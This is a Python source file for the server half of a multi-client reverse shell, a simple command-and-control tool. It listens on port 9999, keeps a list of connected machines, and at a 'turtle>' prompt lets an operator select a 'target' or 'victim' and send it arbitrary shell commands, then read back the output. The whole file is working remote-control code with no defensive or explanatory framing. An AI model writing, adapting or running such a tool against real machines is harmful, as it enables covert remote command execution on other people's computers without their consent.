import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = [] 

# Create a socket (connect to computers)
def create_socket():
    try: 
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening for connections
def bind_socket():
   try: 
        global host
        global port
        global s

        print("Binding the port: " + str(port))
        
        s.bind((host, port))
        s.listen(5)
    
   except socket.error as msg:
       print("Socket Binding Error" + str(msg) + "\nRetrying...")
       bind_socket()
       
# Handling connections from multiple clients and saving to a list
# Closing previous connections when server.py is restarted

def accepting_connections():
    for c in all_connections:
        c.close()
        
    del all_connections[:]
    del all_address[:]
    
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) # prevents timeout 
            all_connections.append(conn)
            all_address.append(address)
            print("Connection has been established :" + address[0])
        except:
            print("Error accepting connections")

# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt for sending commands
# turtle> list
# 0 Friend-A Port-A
# 1 Friend-B Port-B
# 2 Friend-C Port-C
# turtle> select 1
# 192.168.0.112> dir

def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            # list all clients connected to server.py
            list_connections()
        
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        
        else:
            print('Commands not recognized')
    
# Display all current active connections with the client
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + " | " + str(all_address[i][0]) + " | " + str(all_address[i][1]) + "\n"
    
    print("---- Clients ----" + "\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '') # target = id
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to : " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Selection not valid")
        return None
    
# Send commands to client/victim or a friend
def send_target_commands(conn):
    # for running multiple commands on client computer
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            # something is typed from server
            if len(str.encode(cmd)) > 0:
                # command sent to client in form of bytes
                conn.send(str.encode(cmd))
                # receiving bytes from client in chunks and converting them to string
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True # whenever program ends, thread also ends
        t.start()

# Do next job that is in the queue (handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()
        queue.task_done()
        
# threads take jobs from queue
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    
def main():
    create_workers()
    create_jobs()
    
main()